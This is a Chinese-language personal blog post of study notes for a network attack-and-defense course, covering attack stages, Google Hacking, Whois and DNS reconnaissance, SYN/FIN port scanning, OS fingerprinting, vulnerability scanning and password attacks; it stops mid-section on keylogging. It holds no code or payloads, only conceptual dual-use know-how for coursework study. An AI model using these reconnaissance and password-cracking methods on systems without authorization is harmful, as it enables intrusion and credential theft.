<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="RealSpaccr/huhu994/Moore Dylan">


    <meta name="subtitle" content="GOGOGOGOGO">


    <meta name="description" content="Write something about something">





<title>网络攻防技术复习 | Huhu994&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">



<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
</style>



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    




    <!-- scripts list from _config.yml -->
    
    <script src="/js/frame.js"></script>
    







    <script src='https://unpkg.com/valine@1.4.16/dist/Valine.min.js'></script>




  <meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <div class="mask-border">
    </div>

    <div class="wrapper">

      <div class="header">
  <div class="flex-container">
    <div class="header-inner">
      <div class="site-brand-container">
        <a href="/">
          
            Frame.
          
        </a>
      </div>
      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
        Menu
      </div>
      <nav class="site-nav">
        <ul class="menu-list">
          
            
              <li class="menu-item">
                <a href="/">Home</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/archives/">Archive</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/categories/gallery/">Gallery</a>
              </li> 
                   
          
          
            <li class="menu-item search-btn">
              <a href="#">Search</a>
            </li>
          
        </ul>
      </nav>
    </div>
  </div>
</div>


      <div class="main">
        <div class="flex-container">
          <article id="post">

  
    <div class="post-head">
    <div class="post-info">
        <div class="tag-list">
            
        </div>
        <div class="post-title">
            
            
                网络攻防技术复习
            
            
        </div>
        <span class="post-date">
            Dec 29, 2023
        </span>
    </div>
    <div class="post-img">
        
            <div class="h-line-primary"></div>
              
    </div>
</div>
    <div class="post-content">
    <h1 id="网络攻防技术"><a href="#网络攻防技术" class="headerlink" title="网络攻防技术*"></a>网络攻防技术*</h1><h2 id="攻击分类的标准-amp-类别"><a href="#攻击分类的标准-amp-类别" class="headerlink" title="攻击分类的标准&amp;类别*"></a>攻击分类的标准&amp;类别*</h2><h3 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h3><p>日常对网络攻击的分类并不严谨，学术上攻击分类从入侵检测需求出发，要求遵循以下标准：</p>
<ul>
<li><p><strong>互斥性</strong>（分类类别不应重叠）</p>
</li>
<li><p><strong>完备性</strong>（覆盖所有可能的攻击）</p>
</li>
<li><p><strong>非二义性</strong>（类别划分清晰）</p>
</li>
<li><p><strong>可重复性</strong>（对一个样本多次分类结果一致）</p>
</li>
<li><p><strong>可接受性</strong>（符合逻辑和直觉）</p>
</li>
<li><p><strong>实用性</strong>（可用于深入研究和调查）</p>
</li>
</ul>
<br>

<h3 id="类别"><a href="#类别" class="headerlink" title="类别"></a>类别</h3><p>按照攻击发生时，攻守双方之间的交互关系进行分类：</p>
<ul>
<li><strong>本地攻击&#x2F;物理攻击</strong></li>
</ul>
<p>攻击者通过<strong>实际接触</strong>被攻击的主机而实施的攻击。（如：U盘、拔网线）</p>
<ul>
<li><strong>主动攻击（服务器端）</strong></li>
</ul>
<p>攻击者对被攻击主机所运行的 Web、FTP（文件传输协议）、Telnet等<strong>开放网络服务</strong>实施攻击。</p>
<blockquote>
<p>攻击者——&gt;服务器</p>
</blockquote>
<ul>
<li><strong>被动攻击（客户端）</strong></li>
</ul>
<p>攻击者利用浏览器、邮件接收程序、文字处理程序等<strong>客户端应用程序漏洞或系统用户弱点</strong>，对目标实施各种攻击。（局限于受害者自己的弱点，如：钓鱼网站&#x2F;邮件、XSS等）</p>
<blockquote>
<p>用户&lt;——恶意服务器</p>
</blockquote>
<ul>
<li><strong>中间人攻击</strong></li>
</ul>
<p>指攻击者处于被攻击主机的某个网络应用的<strong>中间人位置</strong>，进行数据窃听、破坏和篡改等攻击。</p>
<blockquote>
<p>​         攻击者<br>​                     |<br>客户程序 &lt;—— 服务器</p>
</blockquote>
<br>

<h2 id="攻击步骤与方法"><a href="#攻击步骤与方法" class="headerlink" title="攻击步骤与方法*"></a>攻击步骤与方法*</h2><p><em><strong>每个步骤的详细理解</strong></em></p>
<p>一个完整的、有预谋的攻击通常可以分为5个步骤：</p>
<ol>
<li>信息收集</li>
<li>权限获取</li>
<li>安装后门</li>
<li>扩大影响</li>
<li>消除痕迹</li>
</ol>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h3><p>任务和目的：尽可能多的收集目标的相关信息，为后续的精确攻击建立基础。</p>
<p>主要方法：</p>
<ul>
<li>主动攻击<ul>
<li>利用公开信息服务</li>
<li>主机扫描与端口扫描</li>
<li>操作系统探测与应用程序类型识别</li>
</ul>
</li>
</ul>
<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a><strong>获取权限</strong></h3><p>任务和目的：获取目标系统的读、写、执行等权限。</p>
<p>主要方法：</p>
<ul>
<li>主动攻击：<ul>
<li>口令攻击</li>
<li>缓冲区溢出</li>
<li>脚本攻击</li>
</ul>
</li>
<li>被动攻击：<ul>
<li>特洛伊木马</li>
<li>使用邮件、IM等发送恶意链接</li>
</ul>
</li>
</ul>
<h3 id="安装后门"><a href="#安装后门" class="headerlink" title="安装后门"></a><strong>安装后门</strong></h3><p>任务和目的：在目标系统中安装后门程序，以更加方便、更加隐蔽的方式对目标系统进行操控。</p>
<p>主要方法：</p>
<ul>
<li>主机控制木马</li>
<li>Web服务控制木马</li>
</ul>
<h3 id="扩大影响"><a href="#扩大影响" class="headerlink" title="扩大影响"></a><strong>扩大影响</strong></h3><p>任务和目的：以目标系统为“跳板”，对目标所属网络的其他主机进行攻击，最大程度地扩大攻击的效果。</p>
<p>主要方法：</p>
<ul>
<li>可使用远程攻击主机的所有攻击方式</li>
<li>可使用局域网内部攻击所特有的嗅探、假消息攻击等方式</li>
</ul>
<h3 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a><strong>清除痕迹</strong></h3><p>任务和目的：清除攻击的痕迹，以尽可能长久地对目标进行控制，并防止被识别、追踪。</p>
<p>主要方法：</p>
<ul>
<li>Rootkit隐藏</li>
<li>系统安全日志清除</li>
<li>应用程序日志清除</li>
</ul>
<h2 id="物理攻击-amp-社会工程学"><a href="#物理攻击-amp-社会工程学" class="headerlink" title="物理攻击&amp;社会工程学"></a>物理攻击&amp;社会工程学</h2><h3 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a><strong>物理攻击</strong></h3><p>定义：通过各种技术手段绕开物理安全防护体系，从而进入受保护的设施场所或设备资源内，获取或破坏信息系统物理媒体中受保护信息的攻击方式。</p>
<h3 id="社会工程学攻击"><a href="#社会工程学攻击" class="headerlink" title="社会工程学攻击"></a><strong>社会工程学攻击</strong></h3><p>定义：利用人类的愚蠢，操纵他人执行预期的动作或泄露机密信息的一门艺术与学问。</p>
<p>技巧：</p>
<ul>
<li>不引人关注的职业，攻击新员工，伪装身份，正面攻击，构造陷阱施以援手，制造陷阱骗取同情与帮助</li>
<li>施以小恩小惠，垃圾搜寻，结合多种技术手段</li>
</ul>
<h1 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术*"></a>信息收集技术*</h1><h2 id="公开信息收集"><a href="#公开信息收集" class="headerlink" title="公开信息收集"></a>公开信息收集</h2><p><em><strong>定义、内容、分类及必要性</strong></em></p>
<p>定义：</p>
<p>内容：</p>
<p>利用Web服务</p>
<ul>
<li>网站拥有者信息<ul>
<li>邮编、地址</li>
<li>论坛版本号</li>
<li>网络管理员邮箱</li>
<li>公司人员名单、电话、邮箱</li>
<li>……</li>
</ul>
</li>
<li>得到对应的 IP 地址<ul>
<li>利用 DNS 服务器：提供域名到 IP 地址的映射</li>
</ul>
</li>
<li>获取目标网络拓扑结构<ul>
<li>网络拓扑图</li>
<li>IP 分配表</li>
<li>子域名</li>
<li>网络设备、安全设施</li>
<li>……</li>
</ul>
</li>
</ul>
<p>利用搜索引擎服务</p>
<ul>
<li><p>共同特定：利用公开信息服务收集信息</p>
<ul>
<li>信息是公开的</li>
<li>海里的信息中很多都是敏感信息</li>
</ul>
</li>
<li><p>搜索引擎为我们提供了在 WEB 检索信息的功能。它在互联网收集网站摘要信息的同时，也收集了许多隐蔽信息。</p>
</li>
<li><p>Google Hacking 就是利用搜索引擎强大的搜索功能，选用<strong>搜索语法</strong>和特殊的<strong>搜索关键字</strong>，将隐藏在目标网站中的不恰当配置信息和后门信息找出来。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">基本语法</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="center">AND</td>
<td>与</td>
</tr>
<tr>
<td align="center">OR</td>
<td>或</td>
</tr>
<tr>
<td align="center">+</td>
<td>强制包含搜索项</td>
</tr>
<tr>
<td align="center">-</td>
<td>非，去掉搜索项</td>
</tr>
<tr>
<td align="center">“”</td>
<td>包含一个完整的语义</td>
</tr>
<tr>
<td align="center">.</td>
<td>单个通配符</td>
</tr>
<tr>
<td align="center">*</td>
<td>任意通配符</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="center">高级操作符</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="center">site:</td>
<td>搜索具体服务器或域名的网页</td>
</tr>
<tr>
<td align="center">filetype:</td>
<td>搜索特定类型的文件</td>
</tr>
<tr>
<td align="center">intitle:</td>
<td>搜索网页标题</td>
</tr>
<tr>
<td align="center">inurl:</td>
<td>搜索URL</td>
</tr>
<tr>
<td align="center">intext:</td>
<td>搜索正文</td>
</tr>
<tr>
<td align="center">link:</td>
<td>搜索连接到指定网页的网页</td>
</tr>
</tbody></table>
<ul>
<li>Google Hacking 可以做到<ul>
<li>搜索密码文件</li>
<li>搜索管理员后台URL</li>
<li>搜索Web应用漏洞</li>
<li>搜索黑客留下的后门</li>
<li>……</li>
</ul>
</li>
</ul>
<p>利用 Whols 服务</p>
<ul>
<li>功能：查询已注册域名的拥有者信息<ul>
<li>域名登记人信息</li>
<li>联系电话和邮箱</li>
<li>域名注册时间和更新时间</li>
<li>权威 DNS 的 IP 地址</li>
</ul>
</li>
<li>使用方法：<ul>
<li><a target="_blank" rel="noopener" href="http://www.whois.net/">www.whois.net</a></li>
<li>SamSpade 等网络实用工具</li>
<li>利用网站获得 Whois 数据</li>
<li>企业的备案信息</li>
</ul>
</li>
</ul>
<p>利用DNS域名服务</p>
<ul>
<li>DNS：提供域名到 IP 地址的映射<ul>
<li>权威 DNS——主 DNS</li>
<li>Cache-Only DNS——副 DNS</li>
</ul>
</li>
<li>区域传送（Zone transfer）：允许一个辅域名服务器更新自己的区域数据</li>
<li>如果 DNS 配置不当，可能造成内部主机名和 IP 地址对的泄露</li>
</ul>
<p>公开信息收集方法的应用</p>
<ul>
<li>社会工程学</li>
<li>Maltego：开源情报收集和取证的工具</li>
</ul>
<h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描*"></a>网络扫描*</h2><p><em><strong>类型（主机 \ 端口 \ 系统类型扫描）、原理</strong></em></p>
<p>扫描方法可分为两类：</p>
<ul>
<li>主动扫描<ul>
<li>向目标发送探测数据包<strong>获得的回应</strong>来获得目标的信息。</li>
</ul>
</li>
<li>被动扫描<ul>
<li>不主动向外发送数据包，只是通过<strong>捕获网络内传输的数据包</strong>来获得目标的信息。</li>
</ul>
</li>
</ul>
<p>主动扫描：</p>
<ul>
<li>主机扫描：查看目标网络中有哪些主机是存活的。</li>
<li>端口扫描：查看存活的主机运行了哪些服务，比如 WWW，FTP，Telnet等。</li>
<li>系统类型扫描：查看目标主机运行的操作系统类型以及版本。</li>
</ul>
<h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><ul>
<li>Ping</li>
</ul>
<p>​			Ping 使用 ICMP（因特网控制报文协议）协议进行工作。</p>
<ul>
<li>ICMP<ul>
<li>ICMP 是 IP 层的一个部分，主要有两大功能：网络信息查询、IP 传送时的差错报告与控制（比如目标不可达、路由重定向）</li>
<li>报文格式：<ul>
<li>类型域（type）：用来指明该 ICMP 报文的类型</li>
<li>代码域（code）：确定该包具体作用</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231219212017306.png" alt="image-20231219212017306" style="zoom:67%;" />



<ul>
<li>常见的ICMP报文类型</li>
</ul>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">ICMP Destination Unreachable（ICMP 目标不可达）</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">ICMP Source Quench（ICMP 源抑制）</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">ICMP Redirection（ICMP 重定向）</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">ICMP Timestamp Request&#x2F;Reply（ICMP 时间戳请求&#x2F;应答）</td>
<td align="center">13&#x2F;14</td>
</tr>
<tr>
<td align="center">ICMP Address Mask Request&#x2F;Reply（ICMP 子网掩码请求&#x2F;应答）</td>
<td align="center">17&#x2F;18</td>
</tr>
<tr>
<td align="center">ICMP Echo Request&#x2F;Reply（ICMP 响应请求&#x2F;应答）</td>
<td align="center">8&#x2F;0</td>
</tr>
</tbody></table>
<ul>
<li><p>Ping的实现机制</p>
<ul>
<li>向目标主机发送 ICMP Echo Request（type 8）数据包，等待回复的 ICMP Echo Reply包（type 0）</li>
<li>数据区包含了一些随机测试数据，如 « A B C D E F G… » 等</li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li>根据RFC的定义，TCP&#x2F;IP协议栈应该支持各种类型的ICMP报文。但事实上，在各个操作系统具体实现TCP&#x2F;IP时，可能并没有完全遵循RFC标准。即某些操作系统不一定会对ICMP子网掩码请求或是ICMP时间戳请求做出应答。</li>
</ul>
</li>
<li><p>高级IP扫描技术</p>
<ul>
<li>构造异常的IP包头<ul>
<li>向目标主机发送包头错误的IP包，目标主机或过滤设备如果存活则会反馈 ICMP Parameter Problem Error信息。常见的伪造错误字段为 Header Length Field 和 IP Options Field。</li>
</ul>
</li>
<li>在IP头中设置无效的字段值<ul>
<li>向目标主机发送的IP包中填充错误的字段值，目标主机或过滤设备如果存则会反馈 ICMP Destination Unreachable 信息。</li>
</ul>
</li>
<li>构造错误的数据分片<ul>
<li>当目标主机接收到错误的数据分片（如某些分片丢失)，并且在规定的时间间隔内得不到更正时，将会丢弃这些数据包，并且向主机发送 ICMP Fragment Reassembly Time Exceeded 报文。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul>
<li><p>端口是通信的通道——入侵通道</p>
</li>
<li><p>端口分为 TCP 端口和 UDP 端口</p>
</li>
<li><p>端口扫描可以分为：</p>
<ul>
<li>TCP 扫描</li>
<li>UDP 扫描</li>
</ul>
</li>
</ul>
<h4 id="基本扫描（TCP-Connect）"><a href="#基本扫描（TCP-Connect）" class="headerlink" title="基本扫描（TCP Connect）"></a>基本扫描（TCP Connect）</h4><ul>
<li>用 Socket 开发 TCP 应用<ul>
<li>客户端利用 Socket 向服务器端口发送一个 Connect 请求，如果服务器正常允许，Connect 将返回一个已建立的 TCP 连接。通过这个连接，客户端和服务器之间完成正常的数据交互。</li>
<li>如果仅仅判断目标主机上的某个端口是否运行着一个服务，那么只需要用 Socket 向目标端口发送一个 Connect 请求，再连接建立后关闭即可。</li>
<li>connect() 函数<ul>
<li>当返回值为0时，连接成功</li>
</ul>
</li>
<li>优点<ul>
<li>实现简单，几乎所有支持 TCP&#x2F;IP 的操作系统都提供了 TCP Connect 调用的 API</li>
<li>可以用普通用户权限执行</li>
</ul>
</li>
<li>缺点<ul>
<li>容易被防火墙检测</li>
<li>会被目标的操作系统或服务记录</li>
</ul>
</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231220134853794.png" alt="image-20231220134853794" style="zoom:67%;" />



<h4 id="隐秘扫描（SYN扫描和FIN扫描）"><a href="#隐秘扫描（SYN扫描和FIN扫描）" class="headerlink" title="隐秘扫描（SYN扫描和FIN扫描）"></a>隐秘扫描（SYN扫描和FIN扫描）</h4><ul>
<li><p>特点：</p>
<ul>
<li>扫描必须向目标发送某种数据包，而对于这种数据包，开放端口和关闭端口的响应是有差异的。</li>
<li>这种数据包的发送和接收过程往往不同于正常的TCP数据的发送和接收过程。</li>
</ul>
</li>
<li><p>正常的TCP三次握手:</p>
<ul>
<li>客户端发送 SYN 包</li>
<li>服务器回送 SYN|ACK 包</li>
<li>客户端回送 ACK 包</li>
</ul>
</li>
</ul>
<img src="D:\PicGo\typoraimage\image-20231220145431762.png" alt="image-20231220145431762" style="zoom:67%;" />



<p>SYN 扫描（也被称为半打开扫描）</p>
<ul>
<li><p>特点：</p>
<ul>
<li><p>即不需要发送最后一个 ACK 数据包（可以使这次扫描变得隐蔽）</p>
</li>
<li><p>因为我们检测一个端口是否打开，并不需要完全地建立一个连接</p>
</li>
<li><p>只要服务器回送了 SYN|ACK 包就说明该端口是打开的</p>
</li>
</ul>
</li>
<li><p>判断端口是否打开：</p>
<ul>
<li>若返回信息为 SYN|ACK，则该端口处于监听状态</li>
<li>若返回信息为 RST，则该端口没有处于监听状态</li>
</ul>
</li>
<li><p>优点：</p>
<ul>
<li>一般不会被目标主机的应用所记录</li>
</ul>
</li>
<li><p>缺点：</p>
<ul>
<li>运行 Raw Socket 时必须拥有管理员权限</li>
</ul>
</li>
</ul>
<p>FIN扫描</p>
<ul>
<li>对于 FIN 报文的回复：<ul>
<li>TCP 标准<ul>
<li>关闭的端口：返回RST报文</li>
<li>打开的端口：忽略</li>
</ul>
</li>
<li>Unix BSD 操作系统<ul>
<li>与TCP标准一致</li>
</ul>
</li>
<li>其他操作系统<ul>
<li>均返回RST报文</li>
</ul>
</li>
</ul>
</li>
<li>优点：<ul>
<li>不会被记录到日志</li>
<li>可以绕过某些防火墙</li>
<li>Netstate 命令不会显示主机收到了扫描（因为该命令只能显示 TCP 连接或连接的尝试）</li>
</ul>
</li>
<li>缺点：<ul>
<li>使用 RAW IP 编程，实现起来相对复杂</li>
<li>不同操作系统结果不同，因此不完全可信</li>
</ul>
</li>
</ul>
<h4 id="其他端口扫描技术"><a href="#其他端口扫描技术" class="headerlink" title="其他端口扫描技术"></a>其他端口扫描技术</h4><p>SYN+ACK扫描</p>
<p><strong>TCP XMAS扫描</strong></p>
<p><strong>NULL扫描</strong></p>
<p>IP分段扫描</p>
<p><strong>TCP FTP Proxy扫描</strong></p>
<p>PS： UDP端口扫描技术</p>
<h4 id="端口扫描常用工具"><a href="#端口扫描常用工具" class="headerlink" title="端口扫描常用工具"></a>端口扫描常用工具</h4><p>UNIX 下的端口扫描工具</p>
<ul>
<li>Nmap</li>
</ul>
<p>Windows下的端口扫描工具</p>
<ul>
<li>SuperScan</li>
<li>Nmap for windows</li>
</ul>
<h3 id="系统类型扫描"><a href="#系统类型扫描" class="headerlink" title="系统类型扫描"></a>系统类型扫描</h3><h4 id="利用端口扫描的结果"><a href="#利用端口扫描的结果" class="headerlink" title="利用端口扫描的结果"></a>利用端口扫描的结果</h4><p>操作系统往往提供一些自身特有的功能，而这些功能又很有可能打开一些特定的端口。</p>
<ul>
<li>windows： 137、139、445等端口</li>
<li>Linux： 512~514、2049等端口</li>
</ul>
<h4 id="利用Banner"><a href="#利用Banner" class="headerlink" title="利用Banner"></a>利用Banner</h4><p>所谓 Banner（旗标）指的是服务程序接收到客户端的正常连接后所给出的欢迎信息。</p>
<p>e.g： 220 *** Microsoft FTP service (version 5.0)</p>
<h4 id="利用-TCP-x2F-IP-协议栈指纹"><a href="#利用-TCP-x2F-IP-协议栈指纹" class="headerlink" title="利用 TCP&#x2F;IP 协议栈指纹"></a>利用 TCP&#x2F;IP 协议栈指纹</h4><p><em>最准确的方式</em></p>
<p>不同的操作系统在实现 TCP&#x2F;IP 协议栈时都或多或少地存在着差异。而这些差异，我们就称之为 TCP&#x2F;IP 协议栈指纹。</p>
<ul>
<li><p>不同的操作系统在实现 TCP&#x2F;IP 协议栈的时候，并不是完全按照 RFC 所定义的标准来实现的。</p>
</li>
<li><p>在 RFC 中也没有对所有的问题给予准确的定义。</p>
</li>
</ul>
<p>TCP指纹：</p>
<img src="D:\PicGo\typoraimage\image-20231220181657458.png" alt="image-20231220181657458" style="zoom: 67%;" />



<p>ICMP指纹：</p>
<img src="D:\PicGo\typoraimage\image-20231220181715079.png" alt="image-20231220181715079" style="zoom:67%;" />



<p>协议栈指纹探测工具：</p>
<ul>
<li>Checkos</li>
<li>Queso</li>
<li>Nmap</li>
</ul>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p><em>目的、原理、组件及方法</em></p>
<p>漏洞又称<strong>脆弱性</strong>，是指计算机系统在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷或不足。</p>
<p>漏洞的来源：</p>
<ul>
<li>硬件、软件或协议涉设计时的瑕疵</li>
<li>硬件、软件或协议实现中的弱点</li>
<li>硬件、软件本身的瑕疵</li>
<li>系统和网络的错误配置</li>
</ul>
<p>漏洞扫描：指利用一些专门或综合漏洞扫描程序对目标存在的系统漏洞或应用程序漏洞进行扫描。</p>
<p>缺陷：</p>
<ul>
<li>报告不一定可靠</li>
<li>以暴露目标</li>
</ul>
<p>漏洞检测就是对重要计算机信息系统进行检查，发现其中可被黑客利用的漏洞。</p>
<p>该技术通常采用两种策略，即被动式策略和主动式策略：</p>
<ul>
<li>被动式策略<ul>
<li>基于主机的检测，对系统中不合适的设置、脆弱的口令以及其他安全规则相抵触的对象进行检查。</li>
</ul>
</li>
<li>主动式策略<ul>
<li>基于网络的检测，通过执行一些脚本文件对系统进行攻击，并记录他的反应，从而发现其中的漏洞。</li>
</ul>
</li>
</ul>
<p>该技术的主要方法：直接测试、推断、带凭证的测试</p>
<ul>
<li><p>直接测试：利用漏洞特点发现系统漏洞的方法。</p>
<ul>
<li>通常用于对 Web 服务器漏洞、拒绝服务（Dos）漏洞进行检测。</li>
<li>能够准确地判断系统是否存在特定漏洞。</li>
<li>对于渗透所需步骤较多的漏洞速度较慢。</li>
<li>攻击性较强，可能对存在漏洞的系统造成破坏。</li>
<li>对于Dos漏洞，测试方法会造成系统崩溃。</li>
<li>不是所有漏洞的信息都能通过直接测试方法获得。</li>
</ul>
</li>
<li><p>推断：不利用系统漏洞而判断漏洞是否存在的方法。并不直接渗透漏洞，只是间接地寻找漏洞存在的证据。</p>
<ul>
<li>主要方法：版本检查、程序行为分析、操作系统堆栈指纹分析、时序分析<ul>
<li>版本检查是最简单的</li>
<li>行为分析在需要推翻某个 « 风险假设 » 十分有用</li>
</ul>
</li>
</ul>
</li>
<li><p>凭证：访问服务所需要的用户名或者密码，包括 UNIX 的登录权限和从网络调用 Windows NT 的 API 的能力。</p>
</li>
</ul>
<p>漏洞扫描软件：</p>
<ul>
<li>ISS</li>
<li>SATAN &#x2F; SAINT</li>
<li>Nessus*</li>
</ul>
<h2 id="网络拓扑探测"><a href="#网络拓扑探测" class="headerlink" title="网络拓扑探测"></a>网络拓扑探测</h2><p><em>（拓扑探测 \ 网络设备识别 \ 网络实体IP地理位置定位）</em></p>
<h3 id="拓扑探测"><a href="#拓扑探测" class="headerlink" title="拓扑探测"></a>拓扑探测</h3><ul>
<li>Traceroute：用来发现实际的路由</li>
<li>SNMP</li>
</ul>
<p>SNMP</p>
<ul>
<li>不同类型网络设备之间<strong>客户机 &#x2F; 服务器</strong>模式的简单通信协议。</li>
<li>两个基本命令模式：<ul>
<li>Read：观察设备配置信息。</li>
<li>Read &#x2F; Write：有权写入信息。</li>
</ul>
</li>
</ul>
<h3 id="网络设备（路由器-x2F-交换机）识别"><a href="#网络设备（路由器-x2F-交换机）识别" class="headerlink" title="网络设备（路由器 &#x2F; 交换机）识别"></a>网络设备（路由器 &#x2F; 交换机）识别</h3><p>搜索引擎：Sodan、ZoomEye</p>
<p>基于设备指纹的设备类型探测</p>
<ul>
<li>Banner 信息的获取渠道：<ul>
<li>FTP 协议</li>
<li>SSH</li>
<li>Telnet</li>
<li>HTTP</li>
</ul>
</li>
</ul>
<h3 id="网络实体-IP-地理位置定位"><a href="#网络实体-IP-地理位置定位" class="headerlink" title="网络实体 IP 地理位置定位"></a>网络实体 IP 地理位置定位</h3><p>基于查询信息的定位</p>
<ul>
<li>通过查询机构注册的信息确定网络设备的地理位置</li>
</ul>
<p>基于网络测量的定位</p>
<ul>
<li>利用探测源与目标实体的时延、拓扑或其他信息估计目标实体的位置</li>
</ul>
<h1 id="口令攻击"><a href="#口令攻击" class="headerlink" title="口令攻击"></a>口令攻击</h1><h2 id="口令的定义及作用"><a href="#口令的定义及作用" class="headerlink" title="口令的定义及作用"></a>口令的定义及作用</h2><p><em>操作系统口令</em></p>
<p>定义：口令通常指的是一种用于验证身份或获取特定权限的密码或短语。</p>
<p>操作系统口令：操作系统口令通常指的是登录操作系统时所需的密码。</p>
<p>作用：向系统提供唯一标识个体身份的机制，只给个体所需信息的访问权，从而达到保护敏感信息和个人隐私的目的。</p>
<h2 id="针对口令强度的攻击方法"><a href="#针对口令强度的攻击方法" class="headerlink" title="针对口令强度的攻击方法"></a>针对口令强度的攻击方法</h2><p>没有绝对安全的口令，只是攻击者的时间代价不同。</p>
<p>弱口令：简单、有规律、容易记忆的口令。</p>
<ul>
<li>与用户名相同的口令</li>
<li>常用的单词和数字</li>
<li>与键盘位置相关的口令</li>
<li>以年月日作为口令</li>
</ul>
<p>强口令：不容易被发现规律，并且有足够的长度。</p>
<p>攻击方法：</p>
<ul>
<li>强力攻击<ul>
<li>速度足够快的计算机能尝试字母、数字、特殊字符的所有组合，将最终破解所有的口令。</li>
</ul>
</li>
<li>字典攻击<ul>
<li>将使用率较高的口令集中放在字典文件中，通过不同的编译规则生成猜测字典。</li>
</ul>
</li>
<li>组合攻击<ul>
<li>在字典单词尾部串接任意个字母和数字。</li>
</ul>
</li>
<li>撞库攻击<ul>
<li>攻击者通过收集在网络上已泄露的用户名、口令等信息，之后用这些账号和口令尝试批量登录其他网站，最终得到可以登录这些网站的用户账号和口令。</li>
</ul>
</li>
<li>彩虹表攻击<ul>
<li>彩虹表就是一种破解哈希算法的技术，主要可以破解 MD5、HASH 等多种密码。</li>
</ul>
</li>
</ul>
<h2 id="针对口令存储的攻击方法"><a href="#针对口令存储的攻击方法" class="headerlink" title="针对口令存储的攻击方法"></a>针对口令存储的攻击方法</h2><p>通常，系统为了验证的需要，都会将口令以明文或者密文的形式存放在系统中。</p>
<h3 id="针对缓存口令的攻击："><a href="#针对缓存口令的攻击：" class="headerlink" title="针对缓存口令的攻击："></a>针对缓存口令的攻击：</h3><p>在一个系统中，无论口令存放在什么位置，在进行用户的身份验证时，总要加载到内存中，这就存在口令泄露的风险。</p>
<p>除了系统本身，很多应用程序在处理用户口令时，也可能存在泄露。</p>
<ul>
<li>通过网页访问邮箱时，自动显示以前输入的用户名和口令。虽然是*号，但是在内存中是真正的口令。</li>
</ul>
<h3 id="针对口令文件的攻击："><a href="#针对口令文件的攻击：" class="headerlink" title="针对口令文件的攻击："></a>针对口令文件的攻击：</h3><p>文件是口令存储的一种常见方式。</p>
<ul>
<li>Windows 系统的账号和口令存储在 SAM 文件中</li>
<li>Linux 系统的账号和口令存储在 Shadow 文件中</li>
</ul>
<p>Windows Sam 文件：</p>
<ul>
<li>锁定：在操作系统运行期间，Sam 文件被 system 账号锁定，admin 权限也无法访问它。</li>
<li>隐藏：Sam 在注册表中的备份是被隐藏的。</li>
<li>不可读：系统保存 Sam 文件时将其信息进行过压缩处理，不具有可读性。</li>
</ul>
<p>Windows 使用 NTLM 算法作为加密机制：</p>
<ol>
<li>将口令转换为 Unicode 字符串</li>
<li>用 MD4 对口令进行单向 HASH，生成16字节的 HASH 值，NTLMv2 在此基础上增加了双向验证的功能</li>
</ol>
<p>Linux Shadow文件：</p>
<ul>
<li>密码字段有3个部分：使用的算法、salt、密码哈希</li>
<li>Salt 和密码散列编码为可打印字符</li>
<li>多轮哈希函数（减缓暴力攻击）</li>
</ul>
<p><img src="D:\PicGo\typoraimage\image-20231221155932752.png" alt="image-20231221155932752"></p>
<p>Salt 的用途：</p>
<ul>
<li>相同的输入可能导致不同的散列</li>
<li>密码散列 &#x3D; 单向散列循环（密码 || 随机字符串)</li>
<li>随机字符串就是 salt</li>
<li>可以防止字典和彩虹表攻击</li>
</ul>
<h2 id="针对口令传输的攻击方法"><a href="#针对口令传输的攻击方法" class="headerlink" title="针对口令传输的攻击方法"></a>针对口令传输的攻击方法</h2><h3 id="嗅探攻击"><a href="#嗅探攻击" class="headerlink" title="嗅探攻击"></a>嗅探攻击</h3><img src="D:\PicGo\typoraimage\image-20231221161225246.png" alt="image-20231221161225246" style="zoom: 50%;" />

<p>嗅探的前提条件：运行嗅探器的主机和被监听的主机必须在同一个以太网段上。</p>
<ul>
<li><p>以太网是一种使用广播信道的网络，在以太网中所有通信都是广播的。</p>
</li>
<li><p>嗅探器将系统的网络接口设置为混杂模式，可以监听所有流经同一以太网网段的数据包。</p>
</li>
</ul>
<p>网卡的侦听模式：</p>
<ul>
<li>广播模式</li>
<li>组播模式</li>
<li>普通模式</li>
<li>混杂模式</li>
</ul>
<h3 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h3><p>硬件截获：修改主机的键盘接口</p>
